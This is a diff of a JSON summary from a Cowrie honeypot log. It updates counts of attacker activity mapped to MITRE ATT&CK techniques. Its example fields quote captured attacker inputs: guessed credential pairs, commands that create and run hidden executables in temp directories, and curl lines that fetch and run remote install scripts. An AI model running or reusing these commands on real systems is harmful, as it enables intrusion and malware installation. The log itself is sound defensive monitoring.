@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-24 19:02:40",
+  "generated": "2026-09-24 20:03:55",
   "totals": {
-    "commands": 7688,
-    "login_failed": 4985,
-    "login_success": 1896,
-    "sessions": 5558
+    "commands": 8706,
+    "login_failed": 5370,
+    "login_success": 2225,
+    "sessions": 5963
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4985,
+      "count": 5370,
       "examples": [
         "suser / 123456",
         "antonio / antonio",
@@ -21,14 +21,14 @@
         "root / Pass2024"
       ],
       "first": "2026-09-24T00:00:32.122319Z",
-      "last": "2026-09-24T19:02:33.779026Z",
-      "unique_ips": 135
+      "last": "2026-09-24T20:03:55.246694Z",
+      "unique_ips": 140
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1896,
+      "count": 2225,
       "examples": [
         "root / root",
         "root / mk@123456",
@@ -37,14 +37,14 @@
         "user / user"
       ],
       "first": "2026-09-24T00:04:51.269971Z",
-      "last": "2026-09-24T19:02:34.478584Z",
-      "unique_ips": 111
+      "last": "2026-09-24T20:03:50.265857Z",
+      "unique_ips": 115
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 1054,
+      "count": 1078,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -53,8 +53,8 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-24T00:04:54.092424Z",
-      "last": "2026-09-24T18:55:33.591533Z",
-      "unique_ips": 65
+      "last": "2026-09-24T19:53:51.687473Z",
+      "unique_ips": 66
     },
     {
       "id": "T1083",
@@ -75,7 +75,7 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 206,
+      "count": 207,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -84,14 +84,14 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-24T00:16:03.897652Z",
-      "last": "2026-09-24T18:42:15.674663Z",
-      "unique_ips": 37
+      "last": "2026-09-24T19:23:46.826115Z",
+      "unique_ips": 38
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 89,
+      "count": 91,
       "examples": [
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
@@ -100,7 +100,7 @@
         "mkdir -p /usr/lib/.sysd-scan/tmhome && curl -sL -o /tmp/tm.sh https://del.sou.pp.ua/install_tm.sh && cd /usr/lib/.sysd-s"
       ],
       "first": "2026-09-24T00:15:58.081526Z",
-      "last": "2026-09-24T17:54:14.324792Z",
+      "last": "2026-09-24T19:10:12.690687Z",
       "unique_ips": 35
     },
     {
@@ -214,31 +214,31 @@
   "unmapped": [
     [
       "sh",
-      1803
+      2127
     ],
     [
       "system",
-      1803
+      2126
     ],
     [
       "shell",
-      865
+      1189
     ],
     [
       "/bin/busybox HISILICON",
-      238
+      244
     ],
     [
       "enable",
-      168
+      172
     ],
     [
       "ping; sh",
-      160
+      164
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      80
+      82
     ],
     [
       "root",
